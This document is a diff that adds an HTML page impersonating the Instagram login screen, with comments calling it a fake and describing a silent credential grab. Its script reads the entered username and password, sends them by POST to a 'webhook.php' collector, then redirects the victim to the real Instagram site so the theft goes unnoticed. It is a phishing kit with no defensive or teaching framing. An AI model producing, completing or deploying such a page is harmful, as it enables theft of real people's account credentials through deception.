@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <!-- Your fake IG CSS here -->
+</head>
+<body>
+    <form id="loginForm" style="display: none;">  <!-- Hidden form for silent submit -->
+        <input type="text" name="username" id="user" placeholder="Username">
+        <input type="password" name="password" id="pass" placeholder="Password">
+        <button type="submit">Log In</button>
+    </form>
+
+    <!-- Fake login button that triggers silent submit -->
+    <button onclick="fakeLogin()">Log In</button>
+
+    <script>
+    function fakeLogin() {
+        const form = document.getElementById('loginForm');
+        const username = document.getElementById('user').value;
+        const password = document.getElementById('pass').value;
+        
+        if (username && password) {
+            // Silent POST to webhook, NO page reload
+            fetch('webhook.php', {
+                method: 'POST',
+                body: new URLSearchParams({
+                    'username': username,
+                    'password': password
+                })
+            }).then(() => {
+                // Immediately redirect - user never sees webhook response
+                window.location.href = 'https://www.instagram.com/';
+            });
+        }
+    }
+    </script>
+</body>
+</html>
